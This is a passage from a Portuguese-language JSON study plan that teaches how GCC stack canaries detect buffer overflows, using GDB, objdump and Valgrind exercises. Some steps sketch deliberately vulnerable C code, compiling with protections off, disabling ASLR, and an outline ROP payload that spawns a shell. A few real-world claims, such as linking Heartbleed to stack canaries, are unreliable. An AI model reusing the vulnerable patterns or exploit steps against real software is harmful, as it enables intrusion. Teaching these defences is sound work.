                                "Sistemas Operacionais: proteções de kernel e ASLR.",
                                "Análise de Malware: detecção de exploits em runtime."
                              ],
                              "realWorldApplication": "Em auditorias de segurança e pentests, identificar a presença e estrutura de canários em binários compilados permite avaliar defesas contra buffer overflows, planejar bypasses ou fortalecer proteções em software real, como em servidores web vulneráveis ou firmwares IoT."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.1.2",
                            "name": "Explicar o papel do compilador na inserção de canários",
                            "description": "Descrever como compiladores como GCC utilizam flags como -fstack-protector para inserir automaticamente valores canários gerados em tempo de compilação ou execução.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Básicos de Canários na Pilha",
                                  "subSteps": [
                                    "Estude o que é um buffer overflow e como ele pode corromper o frame pointer e return address na pilha.",
                                    "Aprenda que canários são valores sentinela (geralmente 8 bytes) inseridos entre variáveis locais e metadados da pilha.",
                                    "Identifique o papel do canário: detectar corrupção ao comparar valor inserido com valor salvo antes do retorno da função.",
                                    "Revise exemplos visuais de pilha antes e depois de um overflow sem proteção.",
                                    "Anote diferenças entre canários estáticos e dinâmicos (gerados em runtime)."
                                  ],
                                  "verification": "Desenhe um diagrama da pilha mostrando a posição do canário e explique verbalmente ou por escrito como um overflow o corromperia.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação GCC sobre stack protector (https://gcc.gnu.org/onlinedocs/gcc/Instrumentation-Options.html)",
                                    "Editor de texto ou papel para diagramas"
                                  ],
                                  "tips": "Use ferramentas como GDB para visualizar pilhas reais durante o estudo.",
                                  "learningObjective": "Entender a mecânica fundamental dos canários como mecanismo de detecção de overflow.",
                                  "commonMistakes": "Confundir canário com ASLR (que randomiza endereços) ou DEP (que previne execução de dados)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Flags de Compilação para Proteção de Stack",
                                  "subSteps": [
                                    "Instale ou verifique GCC e compile um programa simples com `gcc -fstack-protector-strong example.c`.",
                                    "Compare compilações com e sem flags: `-fstack-protector`, `-fstack-protector-strong`, `-fstack-protector-all`.",
                                    "Leia a documentação das flags para entender níveis de proteção e geração de canários.",
                                    "Teste um código vulnerável a buffer overflow com e sem flag para observar o crash prevention.",
                                    "Registre diferenças no tamanho do binário e mensagens de erro (ex: *** stack smashing detected ***)"
                                  ],
                                  "verification": "Compile dois binários idênticos (com e sem flag) e execute um exploit simples; confirme que o com flag detecta a corrupção.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GCC instalado",
                                    "Código de exemplo vulnerável (fornecido abaixo)",
                                    "Terminal Linux/macOS"
                                  ],
                                  "tips": "Use `gcc -S` para gerar assembly e comparar inserções de canário.",
                                  "learningObjective": "Dominar o uso prático de flags do compilador para ativar inserção automática de canários.",
                                  "commonMistakes": "Esquecer de linkar com bibliotecas necessárias ou usar flags incompatíveis com otimizações (-O2)."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar o Código Assembly Gerado pelo Compilador",
                                  "subSteps": [
                                    "Compile com `gcc -fstack-protector-strong -S vuln.c -o vuln.s` para gerar assembly.",
                                    "Identifique no .s as instruções de geração do canário (ex: __stack_chk_guard via call para __stack_chk_fail).",
                                    "Trace o fluxo: inserção do canário após alocação local, salvamento no início da função, verificação antes do ret.",
                                    "Compare assembly com/ sem flag para destacar inserções (mov %gs:0x14, %eax etc.).",
                                    "Use objdump ou GDB para inspecionar binários compilados."
                                  ],
                                  "verification": "Explique linha por linha as 5-10 instruções chave relacionadas ao canário no assembly gerado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "GCC com suporte a -S",
                                    "Exemplo de código C vulnerável",
                                    "Ferramentas: objdump, GDB"
                                  ],
                                  "tips": "Ative verbose com `gcc -v` para ver detalhes da instrumentação.",
                                  "learningObjective": "Interpretar como o compilador modifica o código em tempo de compilação para inserir e verificar canários.",
                                  "commonMistakes": "Ignorar seções como .text ou confundir registradores (ex: %gs em x86_64 para TLS)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Geração e Verificação em Runtime",
                                  "subSteps": [
                                    "Execute o programa em GDB: defina breakpoints no início/fim da função e inspecione __stack_chk_guard.",
                                    "Demonstre que canários são gerados dinamicamente por thread (via TLS - Thread Local Storage).",
                                    "Simule um overflow controlado e observe a detecção (comparação falha chama __stack_chk_fail).",
                                    "Teste em múltiplas threads para ver isolamento de canários por thread.",
                                    "Documente o ciclo completo: compilação -> inserção -> runtime check -> abort se corrompido."
                                  ],
                                  "verification": "Registre saídas de GDB mostrando valores de canário idênticos no início e fim (ou falha).",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GDB",
                                    "Código compilado com flag",
                                    "Exemplo multi-threaded opcional"
                                  ],
                                  "tips": "Use `watch` no GDB para monitorar o endereço do canário durante execução.",
                                  "learningObjective": "Compreender a geração dinâmica em runtime e verificação para efetividade da proteção.",
                                  "commonMistakes": "Assumir canários estáticos; eles mudam por execução para dificultar bypass."
                                }
                              ],
                              "practicalExample": "Crie vuln.c: int main() { char buf[10]; gets(buf); return 0; }. Compile com `gcc -fstack-protector-strong vuln.c -o vuln`. Execute `python -c 'print \"A\"*20'` | ./vuln → Crash com 'stack smashing detected'. Sem flag: possível segfault ou RCE. Inspecione com `gdb ./vuln`, `disas main` para ver inserções como movq %fs:40,%rax; movq %rax,-8(%rbp).",
                              "finalVerifications": [
                                "Explicar verbalmente o ciclo de vida do canário desde compilação até verificação.",
                                "Gerar e analisar assembly de um programa com -fstack-protector-strong.",
                                "Demonstrar detecção de overflow em código real via terminal/GDB.",
                                "Comparar binários com/ sem flag usando size/objdump.",
                                "Identificar 3 diferenças nos níveis de stack-protector.",
                                "Desenhar pilha com canário corrompido vs intacto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do papel do compilador (inserção automática via flags).",
                                "Capacidade de gerar e interpretar assembly com canários inseridos.",
                                "Demonstração prática de detecção de overflow em runtime.",
                                "Compreensão de geração dinâmica via TLS/GS segment.",
                                "Identificação correta de limitações (ex: não protege heaps).",
                                "Clareza em diagramas e explicações passo a passo."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Análise de código de baixo nível.",
                                "Arquitetura de Computadores: Entendimento de pilha, TLS e registradores segmentados.",
                                "Desenvolvimento de Software: Boas práticas de compilação segura.",
                                "Análise de Malware: Reconhecimento de bypasses de proteções como ROP.",
                                "Sistemas Operacionais: Gerenciamento de threads e aborts de segurança."
                              ],
                              "realWorldApplication": "Em projetos como servidores web (Apache, Nginx) ou binários do sistema (ex: OpenSSH), flags como -fstack-protector-strong previnem exploits de buffer overflow na pilha, como o histórico CVE-2014-0160 (Heartbleed não era stack, mas similar em vulnerabilidades). Empresas como Google usam em Chromium para mitigar ataques remotos, reduzindo superfície de ataque em software compilado."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.1.3",
                            "name": "Visualizar sobrescrita de buffer sem e com canário",
                            "description": "Comparar diagramas de pilha em ataques de buffer overflow, demonstrando como o canário interrompe a sobrescrita antes de alcançar o endereço de retorno.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar ambiente e revisar estrutura básica da pilha",
                                  "subSteps": [
                                    "Instale GCC e GDB no sistema (ex: apt install gcc gdb).",
                                    "Crie um programa C simples com buffer local: void func(char *input) { char buf[64]; strcpy(buf, input); } em main().",
                                    "Compile sem proteções: gcc -g -fno-stack-protector -z execstack vulnerable.c -o no_canary.",
                                    "Execute no GDB: gdb ./no_canary, defina breakpoint em strcpy, examine pilha com 'x/20wx $rsp' ou 'info registers'.",
                                    "Desenhe diagrama da pilha mostrando: buffer local, variáveis salvas, saved BP e return address."
                                  ],
                                  "verification": "Diagrama desenhado corretamente identificando buffer, saved BP e return address na pilha inicial.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "GCC",
                                    "GDB",
                                    "Editor de texto",
                                    "Papel e caneta para diagrama"
                                  ],
                                  "tips": "Use 'bt' para backtrace e 'x/20gx $rsp' para examinar stack em hex; foque em ordem LIFO da pilha.",
                                  "learningObjective": "Compreender o layout inicial da pilha de função em chamadas C sem proteções.",
                                  "commonMistakes": [
                                    "Confundir ordem dos frames (locais primeiro, depois saved BP)",
                                    "Não quebrar antes do input para ver pilha limpa",
                                    "Ignorar alinhamento de 8 bytes em x64"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Visualizar sobrescrita de buffer sem canário",
                                  "subSteps": [
                                    "No GDB, inicie com input longo (ex: 100 'A's via python -c 'print(\"A\"*100)' | ./no_canary).",
                                    "Continue execução (c) e observe segfault no return da func.",
                                    "Examine pilha pós-overflow: 'x/20wx $rsp' mostra return address sobrescrito por 'A's (0x41414141).",
                                    "Desenhe diagrama comparativo: pilha inicial vs. sobrescrita alcançando return address.",
                                    "Teste redirecionando para shellcode simples para confirmar controle de RIP."
                                  ],
                                  "verification": "Diagrama mostra sobrescrita propagando do buffer até return address, causando hijack.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Programa compilado no_canary",
                                    "GDB",
                                    "Python para input"
                                  ],
                                  "tips": "Use 'set follow-fork-mode child' se fork ocorrer; capture output com (gdb) run < input.txt.",
                                  "learningObjective": "Demonstrar como overflow sem proteção permite sobrescrita direta do return address.",
                                  "commonMistakes": [
                                    "Input curto demais (não atinge return)",
                                    "Não examinar $rip pós-segfault",
                                    "Confundir buffer com heap"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Introduzir e visualizar canário na pilha",
                                  "subSteps": [
                                    "Compile com proteção: gcc -g -fstack-protector-all vulnerable.c -o with_canary.",
                                    "No GDB: examine pilha inicial em func: identifique valor canário (8 bytes aleatórios) entre buffer e saved BP.",
                                    "Use 'info proc mappings' ou disassembly para ver __stack_chk_fail.",
                                    "Desenhe diagrama da pilha com canário: buffer | ... | canário | saved BP | return addr.",
                                    "Confirme checksum: valor canário é copiado para registrador e checado no epílogo."
                                  ],
                                  "verification": "Diagrama identifica posição e valor do canário na pilha protegida.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GCC com stack-protector",
                                    "GDB",
                                    "Papel para diagrama"
                                  ],
                                  "tips": "Canário termina com null byte para parar strings; valor é thread-local e regenerado.",
                                  "learningObjective": "Localizar e entender o papel do canário como sentinela na pilha.",
                                  "commonMistakes": [
                                    "Confundir canário com ASLR",
                                    "Não notar que canário é após buffer",
                                    "Ignorar regeneração por thread"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular sobrescrita com canário e comparar diagramas",
                                  "subSteps": [
                                    "Execute with_canary com input longo: observe '*** stack smashing detected ***' e abort antes do return.",
                                    "No GDB, examine após detecção: canário sobrescrito, __stack_chk_fail chamado.",
                                    "Desenhe diagramas lado a lado: sem canário (return sobrescrito) vs. com canário (abort precoce).",
                                    "Explique interrupção: checksum falha no epílogo, previne ROP antes de return.",
                                    "Teste leaking canário (futuro tópico) mas foque na detecção básica."
                                  ],
                                  "verification": "Explicação clara de como canário para sobrescrita no return address, com diagramas comparativos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Programa with_canary",
                                    "GDB",
                                    "Diagramas anteriores"
                                  ],
                                  "tips": "Use 'disas func' para ver call __stack_chk_fail no epílogo; compare dumps de pilha.",
                                  "learningObjective": "Comparar visualmente os dois cenários e demonstrar eficácia do canário.",
                                  "commonMistakes": [
                                    "Pensar que canário criptografa (é só checksum)",
                                    "Não notar abort no epílogo",
                                    "Confundir com DEP/NX"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie vulnerable.c: #include <string.h> void func(char *input) { char buf[64]; strcpy(buf, input); printf('Done\\n'); } int main() { char input[100]; gets(input); func(input); }. Compile: gcc -g -fno-stack-protector vulnerable_no.c -o no_canary e gcc -g -fstack-protector-all vulnerable.c -o with_canary. No GDB: para no_canary, input 'A'*100 leva a segfault com RIP=0x41414141. Para with_canary, input longo aborta com 'stack smashing detected' após checksum falhar, sem hijack.",
                              "finalVerifications": [
                                "Desenha pilha sem canário mostrando sobrescrita completa até return address.",
                                "Identifica posição exata do canário (após buffer, antes saved BP).",
                                "Explica detecção: sobrescrita muda valor, checksum falha no epílogo.",
                                "Compara diagramas: sem proteção = hijack; com = abort precoce.",
                                "Simula em GDB ambos cenários sem erros.",
                                "Discute limitações (ex: leak canário permite bypass)."
                              ],
                              "assessmentCriteria": [
                                "Precisão dos diagramas de pilha (endereços, ordem, sobrescrita): 30%",
                                "Correta identificação e explicação do canário e checksum: 25%",
                                "Demonstração prática no GDB (screenshots ou comandos): 20%",
                                "Comparação clara entre cenários sem/com proteção: 15%",
                                "Compreensão de interrupção antes do return (evita ROP): 10%"
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: ponteiros, strings e strcpy vulnerável.",
                                "Arquitetura de Computadores: pilha x86/x64, registradores RSP/RBP.",
                                "Sistemas Operacionais: proteções de memória como ASLR/DEP.",
                                "Engenharia Reversa: uso de GDB para análise de exploits.",
                                "Análise de Malware: detecção de ROP chains em overflows."
                              ],
                              "realWorldApplication": "Stack canaries previnem exploits de buffer overflow em software real como servidores Apache, navegadores Chrome e kernels Linux, detectando sobrescrita precoce e abortando antes de ROP/JOP attacks, reduzindo superfície de vulnerabilidades em binários compilados com GCC/Clang."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.5.2",
                        "name": "Mecanismo de Verificação e Detecção",
                        "description": "Processo de validação do valor canário antes do retorno da função, detectando alterações causadas por overflows e ativando mecanismos de terminação do programa.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.2.1",
                            "name": "Descrever o fluxo de verificação do canário",
                            "description": "Explicar o pseudocódigo ou assembly equivalente onde o valor do canário é comparado com uma cópia salva no registrador ou em tabela global antes do 'ret'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a colocação inicial do canário no stack frame",
                                  "subSteps": [
                                    "Estude o layout típico de um stack frame em uma função: buffer local, canário, saved EBP, endereço de retorno.",
                                    "Identifique onde o compilador insere o canário automaticamente (após variáveis locais vulneráveis).",
                                    "Analise como o valor do canário é gerado (aleatório por thread, armazenado em tabela global como %fs:0x28 em x86_64).",
                                    "Desenhe um diagrama simples do stack frame antes e após o preenchimento do buffer.",
                                    "Revise exemplos de código C que ativam stack protector (-fstack-protector)."
                                  ],
                                  "verification": "Desenhe e rotule corretamente um stack frame com canário em um papel ou ferramenta digital.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Documentação GCC stack protector, debugger como GDB, diagramas de stack online.",
                                  "tips": "Use cores dump ou GDB para visualizar stack frames reais.",
                                  "learningObjective": "Visualizar precisamente a posição do canário no stack para proteção contra overflows.",
                                  "commonMistakes": "Confundir canário com endereço de retorno ou ignorar alinhamento de stack."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descrever o salvamento da cópia do canário",
                                  "subSteps": [
                                    "Explique como o prólogo da função carrega o canário da tabela global para um registrador (ex: mov %fs:0x28, %eax).",
                                    "Identifique onde a cópia é armazenada: registrador temporário ou diretamente no stack após o canário.",
                                    "Compare abordagens em diferentes arquiteturas (x86 vs ARM).",
                                    "Escreva pseudocódigo para o salvamento: canary_copy = load_canary_from_thread_local().",
                                    "Teste em assembly simples com NASM ou inline asm em C."
                                  ],
                                  "verification": "Escreva e compile um snippet de assembly que salva corretamente o canário em um registrador.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Compilador GCC com -fstack-protector-all, disassembler objdump, man pages de stack_chk.",
                                  "tips": "Use objdump -d para inspecionar código gerado pelo compilador.",
                                  "learningObjective": "Dominar o mecanismo de cópia do canário para comparação posterior.",
                                  "commonMistakes": "Esquecer que o canário é por thread e usar valor estático."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar o fluxo de verificação antes do retorno",
                                  "subSteps": [
                                    "Descreva o epílogo: carregar canário do stack para registrador (mov -8(%rbp), %eax).",
                                    "Detalhe a comparação: cmp %eax, canary_copy; je ok; jne fail.",
                                    "Escreva pseudocódigo completo: if (stack_canary != saved_canary) call __stack_chk_fail().",
                                    "Analise o que __stack_chk_fail faz (abort, log, SIGABRT).",
                                    "Simule em GDB um overflow para ver a detecção falhar."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito o pseudocódigo exato da verificação com registradores envolvidos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "GDB para stepping through código protegido, exemplos de buffer overflow exploits.",
                                  "tips": "Compile com -fstack-protector-strong e teste overflows intencionais.",
                                  "learningObjective": "Articular o fluxo exato de comparação canário vs cópia salva.",
                                  "commonMistakes": "Inverter a ordem: verificar após ret em vez de antes."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar detecção de falha e recuperação",
                                  "subSteps": [
                                    "Descreva ações em falha: chamada para handler que termina o processo.",
                                    "Compare com proteções adicionais como ASLR ou CFI.",
                                    "Discuta limitações: canários não previnem overflows não-controlados.",
                                    "Escreva um fluxograma completo do verificação (sucesso vs falha).",
                                    "Pesquise variações em Windows (GS cookie) vs Linux."
                                  ],
                                  "verification": "Crie um fluxograma que cubra salvamento, verificação e falha.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Ferramentas de diagrama como draw.io, artigos sobre stack canaries (Phrack, OWASP).",
                                  "tips": "Inclua caminhos de branch no fluxograma para clareza.",
                                  "learningObjective": "Compreender o impacto da detecção e suas implicações em segurança.",
                                  "commonMistakes": "Assumir que falha sempre previne exploit (pode ser bypassado)."
                                }
                              ],
                              "practicalExample": "Em uma função C: void func(char* input) { char buf[64]; strcpy(buf, input); } compilada com -fstack-protector. Assembly gerado: prólogo mov %fs:40,%rax; mov %rax,-8(%rbp); ... epílogo: mov -8(%rbp),%rax; cmp %fs:40,%rax; jne .Lfail; ret. Overflow em buf corrompe ret addr mas detectado na cmp.",
                              "finalVerifications": [
                                "Desenhar stack frame com canário rotulado corretamente.",
                                "Escrever pseudocódigo completo do fluxo de verificação.",
                                "Explicar registradores usados em x86_64 Linux.",
                                "Simular detecção de overflow em GDB.",
                                "Comparar cópia salva vs stack canário em diagrama.",
                                "Descrever ação em __stack_chk_fail."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição do prólogo/epílogo (90% match com assembly real).",
                                "Inclusão de todos componentes: geração, salvamento, cmp, fail handler.",
                                "Uso correto de terminologia (canário, thread-local storage, stack protector).",
                                "Demonstração prática via código ou GDB.",
                                "Identificação de pelo menos 2 limitações do mecanismo.",
                                "Fluxograma ou diagrama claro e sequencial."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly: Leitura de registradores e instruções CMP/JE.",
                                "Sistemas Operacionais: Gerenciamento de threads e TLS (Thread Local Storage).",
                                "Engenharia de Software: Práticas de compilação segura (flags GCC/Clang).",
                                "Análise de Vulnerabilidades: Buffer overflows e mitigações DEP/ASLR."
                              ],
                              "realWorldApplication": "Em servidores web como Apache/Nginx, previne ROP exploits em buffer overflows, detectando corrupções antes de hijack de controle de fluxo; usado em browsers (Chrome SSP) para isolar tabs; essencial em firmwares IoT para mitigar ataques remotos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.2.2",
                            "name": "Analisar o impacto em ataques de controle de fluxo",
                            "description": "Demonstrar como canários previnem exploits como ROP (Return-Oriented Programming) ao detectar sobrescrita, forçando abort() ou SIGABRT.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Ataques de Controle de Fluxo e ROP",
                                  "subSteps": [
                                    "Estude o conceito de ataques de controle de fluxo, focando em como eles alteram o fluxo de execução do programa.",
                                    "Aprenda sobre Return-Oriented Programming (ROP): identifique gadgets em código existente para construir chains que bypassam proteções como DEP.",
                                    "Revise a estrutura de um stack frame em C: parâmetros, variável local, canário, saved base pointer e return address.",
                                    "Analise exemplos de buffer overflow que sobrescrevem o return address para redirecionar controle.",
                                    "Discuta limitações de ROP sem proteções de memória."
                                  ],
                                  "verification": "Explique em suas palavras como um ROP chain explora o stack e liste 3 gadgets comuns.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação GCC stack protector, tutoriais ROP (ex: Exploit Exercises), debugger GDB.",
                                  "tips": "Use diagramas visuais do stack para mapear sobrescrita.",
                                  "learningObjective": "Identificar componentes de ROP e seu impacto no controle de fluxo.",
                                  "commonMistakes": "Confundir ROP com injeções simples de shellcode; ignorar ASLR."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Funcionamento dos Canários na Stack",
                                  "subSteps": [
                                    "Compile um programa C com -fstack-protector-all para ativar canários.",
                                    "Examine o código assembly gerado (objdump) para localizar inserção do canário após variáveis locais.",
                                    "Entenda geração randômica do canário por ciclo de processo e verificação na função de retorno.",
                                    "Simule sobrescrita de buffer e observe verificação __stack_chk_fail().",
                                    "Teste em GDB: defina breakpoint na verificação e inspecione registradores."
                                  ],
                                  "verification": "Mostre assembly com canário inserido e explique verificação na saída do frame.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Compilador GCC, GDB, código C de exemplo com buffer overflow.",
                                  "tips": "Use -D_FORTIFY_SOURCE=2 para proteções extras durante testes.",
                                  "learningObjective": "Descrever mecanismo de inserção e validação de canários.",
                                  "commonMistakes": "Assumir canário global; não recompilar com proteções ativadas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Demonstrar Prevenção de ROP via Detecção de Canário",
                                  "subSteps": [
                                    "Crie exploit sem canário: buffer overflow para ROP chain simples (ex: system('/bin/sh')).",
                                    "Execute e confirme sucesso do ROP.",
                                    "Recompile com canário e tente mesmo payload: observe crash via abort() ou SIGABRT.",
                                    "Analise core dump ou strace para confirmar falha em __stack_chk_fail.",
                                    "Compare execuções: mensure como detecção interrompe chain ROP prematuramente."
                                  ],
                                  "verification": "Forneça payloads com/sem sucesso e logs de crash mostrando SIGABRT.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Código vulnerável (ex: stack0 de protostar), Python para payload, GDB/Valgrind.",
                                  "tips": "Desative ASLR temporariamente (echo 0 > /proc/sys/kernel/randomize_va_space) para testes controlados.",
                                  "learningObjective": "Simular e contrastar exploits com/sem canário.",
                                  "commonMistakes": "Payloads que evitam sobrescrita total do stack; ignorar leaks de canário."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Impacto Geral em Ataques de Controle de Fluxo",
                                  "subSteps": [
                                    "Discuta cenários onde ROP falha: sobrescrita detectada antes de return address.",
                                    "Explore respostas: abort() termina processo, SIGABRT gera core dump para forense.",
                                    "Avalie limitações: leaks de canário via format strings ou info leaks.",
                                    "Compare com outras proteções (CFI, ASLR) em mitigações compostas.",
                                    "Documente métricas: taxa de detecção em overflows lineares vs. ROP chains."
                                  ],
                                  "verification": "Escreva relatório resumindo 3 impactos e 2 limitações dos canários contra ROP.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Artigos sobre stack canaries (ex: Aleph One, Phrack), ferramentas como ROPgadget.",
                                  "tips": "Considere variações como stack canaries em linguagens não-C (Rust, Go).",
                                  "learningObjective": "Avaliar eficácia e fraquezas de canários em cenários reais de ROP.",
                                  "commonMistakes": "Superestimar invulnerabilidade; não considerar ataques não-lineares."
                                }
                              ],
                              "practicalExample": "Considere um programa C com função vulnerable(char *input) { char buf[64]; strcpy(buf, input); }. Sem canário, payload 'A'*72 + ROP chain (pop rdi; ret; system; '/bin/sh') redireciona para shell. Com -fstack-protector, sobrescrita corrompe canário, triggerando *** stack smashing detected ***: terminated, impedindo ROP.",
                              "finalVerifications": [
                                "Explicar diagrama stack com canário sobrescrito em ROP attempt.",
                                "Simular em código/GDB: sucesso sem proteção vs. crash com canário.",
                                "Identificar __stack_chk_fail em backtrace de crash.",
                                "Listar 3 cenários onde canário falha (ex: canário leak).",
                                "Comparar tempo de execução: exploit bem-sucedido vs. abort prematuro.",
                                "Prever comportamento em fork() com herança de canário."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de ROP chains e ponto de detecção do canário (90%).",
                                "Demonstração prática com código/exploits reproduzíveis (100%).",
                                "Análise de impactos qualitativos e quantitativos (ex: detecção 100% em overflows lineares).",
                                "Identificação correta de limitações e mitigações complementares.",
                                "Clareza em relatórios/diagramas explicando fluxo de falha.",
                                "Proficiência em ferramentas (GDB, assembly) para verificação."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: manipulação de stack e debugging.",
                                "Sistemas Operacionais: signals (SIGABRT), proteções de processo (ASLR).",
                                "Engenharia Reversa: análise de binários com objdump/ROPgadget.",
                                "Desenvolvimento Seguro: práticas de compilação (hardening flags)."
                              ],
                              "realWorldApplication": "Em servidores web como Apache/Nginx compilados com stack protector, canários previnem ROP em vulnerabilidades como CVE-2014-0160 (Heartbleed-like overflows), forçando crashes controlados em vez de RCE remota, permitindo hotpatching e logs forenses sem comprometimento total do sistema."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.2.3",
                            "name": "Interpretar erros de detecção em ferramentas de depuração",
                            "description": "Usar GDB ou Valgrind para observar falhas de verificação de canário em cenários de overflow, identificando mensagens como '*** stack smashing detected ***'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar um programa C vulnerável a overflow de pilha com proteção de canário",
                                  "subSteps": [
                                    "Escreva um código C simples com um buffer pequeno em uma função e use strcpy ou similar sem verificações de tamanho.",
                                    "Compile o programa usando gcc com a flag -fstack-protector-all para ativar a proteção de canário na pilha.",
                                    "Teste a execução normal do programa com input válido para confirmar que funciona.",
                                    "Crie um input longo (maior que o buffer) para simular o overflow.",
                                    "Verifique o binário resultante com 'readelf' ou 'objdump' para confirmar a presença de seções de proteção."
                                  ],
                                  "verification": "O programa compila sem erros e executa normalmente com input curto, mas falha com input longo exibindo mensagem de stack smashing.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Editor de texto (VS Code ou vim)",
                                    "GCC compiler",
                                    "Terminal Linux/WSL"
                                  ],
                                  "tips": "Use um buffer de 64 bytes e input de 100 bytes para garantir o overflow.",
                                  "learningObjective": "Compreender como ativar e preparar proteções de canário em código C vulnerável.",
                                  "commonMistakes": [
                                    "Esquecer a flag -fstack-protector-all",
                                    "Usar funções seguras como strncpy sem intenção",
                                    "Compilar sem otimização (-O0 para depuração)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar e executar GDB para depuração do programa",
                                  "subSteps": [
                                    "Instale o GDB se necessário (sudo apt install gdb).",
                                    "Compile o programa com símbolos de depuração: gcc -g -fstack-protector-all -o vulneravel vulneravel.c.",
                                    "Inicie o GDB: gdb ./vulneravel.",
                                    "Defina breakpoints na função vulnerável (break main ou break funcao_overflow).",
                                    "Execute com input malicioso usando 'run < input_overflow.txt' ou argumentos."
                                  ],
                                  "verification": "GDB inicia corretamente, breakpoints são atingidos e o programa para na falha com mensagem visível.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "GDB",
                                    "Arquivo de input com payload de overflow"
                                  ],
                                  "tips": "Use 'set environment' no GDB para simular inputs longos se necessário.",
                                  "learningObjective": "Dominar a configuração básica do GDB para observar falhas de runtime em C.",
                                  "commonMistakes": [
                                    "Não compilar com -g para símbolos",
                                    "Executar sem breakpoint, perdendo controle",
                                    "Confundir GDB com execução normal"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar Valgrind para análise de erros de memória",
                                  "subSteps": [
                                    "Instale Valgrind (sudo apt install valgrind).",
                                    "Execute: valgrind --tool=memcheck --leak-check=full ./vulneravel < input_overflow.txt.",
                                    "Observe as saídas detalhadas sobre uso inválido de memória e stack overflow.",
                                    "Repita com input válido para comparar saídas normais vs. erradas.",
                                    "Salve a saída em arquivo para análise: valgrind ... > valgrind_log.txt."
                                  ],
                                  "verification": "Valgrind reporta erros como 'Invalid write' ou 'Stack overflow' com detalhes de endereço e tamanho.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Valgrind",
                                    "Mesmo programa e input do Step 1"
                                  ],
                                  "tips": "Use --track-origins=yes para rastrear origens de uninitialized values.",
                                  "learningObjective": "Aprender a usar Valgrind para detectar e interpretar violações de memória relacionadas a canários.",
                                  "commonMistakes": [
                                    "Executar Valgrind sem input malicioso",
                                    "Ignorar supressões falsas",
                                    "Confundir leaks com overflows"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar e documentar as mensagens de erro de detecção",
                                  "subSteps": [
                                    "Identifique mensagens chave: '*** stack smashing detected ***' no GDB/terminal e detalhes no Valgrind.",
                                    "Analise o contexto: endereço do canário corrompido, tamanho do buffer violado.",
                                    "Compare saídas de GDB e Valgrind, notando diferenças (GDB foca em smashing, Valgrind em memória).",
                                    "Documente em um relatório: causa (overflow), mecanismo (canário alterado), implicações (exploit bloqueado).",
                                    "Teste desabilitando proteção (-fno-stack-protector) para contrastar comportamentos."
                                  ],
                                  "verification": "Relatório escrito explica corretamente a mensagem, causa e detecção em ambas ferramentas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Logs de GDB e Valgrind",
                                    "Editor para relatório"
                                  ],
